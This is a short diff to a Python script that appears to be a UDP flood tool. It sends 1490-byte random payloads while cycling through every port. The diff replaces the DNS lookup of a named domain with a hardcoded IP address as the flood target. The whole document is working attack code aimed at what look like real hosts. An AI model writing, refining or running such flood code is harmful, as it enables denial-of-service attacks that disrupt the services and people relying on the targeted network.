@@ -17,7 +17,8 @@ bytes = random._urandom(1490)
 
 # Get ip.
 url = "liwuhe51.top"
-ip = socket.gethostbyname(url)
+#ip = socket.gethostbyname(url)
+ip = "103.82.54.28"
 
 # Value.
 sent = 1
@@ -35,7 +36,7 @@ if port_mode == False:  # All ports.
         while True:
             if i == 65535:                
                 i = 1
-                ip = socket.gethostbyname(url)
+                #ip = socket.gethostbyname(url)
 
             elif port == 1900:
                 port = 1901
